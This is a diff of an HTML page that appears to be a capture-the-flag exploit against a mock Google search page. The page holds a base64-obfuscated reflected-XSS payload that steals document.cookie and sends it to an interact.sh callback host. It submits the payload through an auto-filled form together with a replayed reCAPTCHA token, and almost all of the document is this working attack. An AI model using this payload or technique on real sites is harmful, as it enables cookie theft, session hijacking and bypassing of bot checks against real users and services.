@@ -1,19 +1,24 @@
 <!doctype html>
 <html><head><title>This is only a test. I repeat, this is only a test. This station...</title></head>
 <body>
+<form action="" method="POST" id="leform">
+  <input name="q" />
+  <input name="g-recaptcha-response" id="input_recaptcha" />
+  <input type="submit" name="btnG" value="Google Search" />
+</form>
+  
 <script>
 payload = atob('PC90aXRsZT48L2hlYWQ+PGJvZHk+PHNjcmlwdD5mdW5jdGlvbitleGlmKGRhdGEpe2RvY3VtZW50LndyaXRlKCI8aW1nK3NyYyUzZGh0dHAlM2EvL2dnbC5jYTBkZ2RoMnZ0YzAwMDA3bnZxZ2dmeWdhZ2h5eXl5eWIuaW50ZXJhY3Quc2glM2YiJTJiYnRvYShkYXRhKSUyYiIvPiIpfSUzYmV4aWYoZG9jdW1lbnQuY29va2llKSUzYjwvc2NyaXB0Pg==');
 recaptcha = '03AGdBq25iheEzHpugdM-nZX_K17CF7076aGt1kOJc2uJmIurYPkFgTTCtVi57-wkODMY03TW_S_BaCgJ5LqE4Eb6AcSR9214HLS-xJf2_5fgX3_G1EH5pwz6aOazvmh41kyCy8bmAMRxHmbo0RBOVjSbFUKX5mZCH7xz03bfwRf0oWZ8XztFtLVSbzJxcd0EVpjkD1xALPf_jE432ZkV83MDgv73wYhueHQtt3k2ePJiVtl2E6kckGs98I7BWgMxOEKV6j9q4ANzJ1yDVN2gh3mYqlLBcDkSjCeY7QxepRgdSJ_8zdoEFia6oN3WTWTxTsd8B0YEr0nNYpoYTcpUxrP7-_oCm1sE42U2Zrr_ehZuZ_wUxOl0FCdYi2EOY0BlrukGZrSgLAP-aFjvDiZ4CbEG0SYmvKwChEcVhbNtOSjB0ZHuSPzStXNyNNi5VK1zbXfc76sKNOs8nJ3FprFrHSMHVepfLJzML4BkHrv8bvuAcihiyZWdvT5w';
 url= 'http://google.us.ctf.so/search.php?q=';
 
+(function() {
+
 window.leform.action = url + payload;
 window.leform.q = payload;
-window.leform.g-recaptcha-response = recaptcha;
+window.input_recaptcha = recaptcha;
+
+})();
 </script>
-<form action="" method="POST" id="leform">
-  <input name="q" />
-  <input name="g-recaptcha-response" />
-  <input type="submit" name="btnG" value="Google Search" />
-</form>
 </body>
 </html>
